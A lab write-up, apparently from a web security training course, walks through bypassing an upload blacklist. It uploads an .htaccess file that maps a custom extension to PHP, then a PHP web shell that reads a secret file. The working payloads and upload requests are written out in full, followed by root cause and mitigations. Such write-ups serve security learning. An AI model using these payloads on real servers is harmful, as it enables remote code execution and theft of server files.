# Lab: Web shell upload via extension blacklist bypass

## Overview

This lab demonstrates a file upload vulnerability where the application attempts to block dangerous file extensions such as `.php`.

The upload directory uses an Apache server, and an attacker can upload a custom `.htaccess` file to redefine which file extensions are executed as PHP. This allows arbitrary code execution even when `.php` files are blocked.

---

## Objective

Upload a malicious file and bypass the extension blacklist using an `.htaccess` configuration file to retrieve the secret stored on the server.

---

## Tools Used

- Burp Suite Community Edition
- Firefox Browser
- Kali Linux
- Apache `.htaccess`
- PHP Web Shell

---

## Vulnerability Explanation

The application blocks files with dangerous extensions such as:

```text
.php
```

However, it allows uploading other files including:

```text
.htaccess
```

An attacker can upload an Apache configuration file that maps a custom extension to PHP:

```apache
AddType application/x-httpd-php .l33t
```

Any file ending in `.l33t` will then be executed as PHP by the server.

---

# Payloads Used

## .htaccess File

```apache
AddType application/x-httpd-php .l33t
```

## PHP Web Shell

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

# Steps to Reproduce

## 1. Open the Lab

Login to the application and navigate to the avatar upload section.

---

## 2. Create .htaccess File

Create a file named:

```text
.htaccess
```

Add the following content:

```apache
AddType application/x-httpd-php .l33t
```

---

## 3. Upload .htaccess File

Intercept the upload request in Burp Suite.

Modify the request so that:

```http
filename=".htaccess"
Content-Type: text/plain
```

Upload the file.

### Request Example

```http
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
```

### Screenshot

![Uploading .htaccess](uploading-configured-extention.png)

---

## 4. Create PHP Payload

Create a file named:

```text
temp.l33t
```

Add the following PHP code:

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

### Screenshot

![PHP Payload](php-file-to-upload.png)

---

## 5. Upload the Payload

Upload:

```text
temp.l33t
```

The application accepts the upload because `.l33t` is not on the blacklist.

---

## 6. Execute the File

Navigate to:

```http
/files/avatars/temp.l33t
```

Apache now treats `.l33t` files as PHP due to the uploaded `.htaccess` configuration.

The server executes the PHP code.

---

## 7. Retrieve Secret

The response displays the contents of:

```text
/home/carlos/secret
```

Example:

```text
<secret_value>
```

This confirms successful Remote Code Execution.

---

# Proof of Concept

## Uploaded .htaccess

```apache
AddType application/x-httpd-php .l33t
```

---

## Uploaded Payload

```php
<?php
echo file_get_contents('/home/carlos/secret');
?>
```

---

## Access Request

```http
GET /files/avatars/temp.l33t HTTP/2
```

---

## Response

```text
<secret_value>
```

---

# Impact

- Remote Code Execution (RCE)
- Arbitrary file upload
- Web shell deployment
- Arbitrary file read
- Complete server compromise
- Potential privilege escalation

---

# Root Cause

The application relies on a blacklist of dangerous extensions.

Because `.htaccess` uploads are allowed:

- Attackers can modify Apache behavior
- New executable extensions can be defined
- Blacklisted extensions can be bypassed
- Arbitrary code execution becomes possible

---

# Mitigation

- Block `.htaccess` uploads
- Disable Apache overrides using:

```apache
AllowOverride None
```

- Store uploads outside the web root
- Use strict allowlists for file types
- Validate uploaded file contents
- Disable script execution in upload directories

---

# Key Learnings

- Learned how extension blacklists can be bypassed
- Understood Apache `.htaccess` abuse
- Practiced modifying upload requests using Burp Suite
- Learned how custom extensions can execute PHP code
- Gained hands-on experience exploiting insecure file upload mechanisms
